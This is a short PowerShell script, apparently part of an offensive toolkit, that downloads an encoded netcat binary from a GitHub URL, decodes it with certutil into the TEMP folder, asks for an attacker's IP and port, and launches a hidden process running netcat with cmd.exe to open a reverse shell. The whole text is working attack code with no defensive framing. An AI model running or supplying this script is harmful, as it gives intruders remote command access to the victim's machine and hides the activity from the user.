

    if ((Test-Path $env:TEMP\nc.exe.txt) -ne $true -and (Test-Path $env:TEMP\nc.exe) -ne $true){

    Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
    certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
    Write-Output ""

    }

    $atk = Read-Host -Prompt "Attackers IP"
    $port = Read-Host -Prompt "Port"
   
    $seshnc = (Get-Process powershell).count
   
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe $atk $port -e cmd.exe"

    $hasrannc = (Get-Process powershell).count

    if ($hasrannc -gt $seshnc){

    Write-Output "Reverse Shell Started"
    Write-Output ""


}


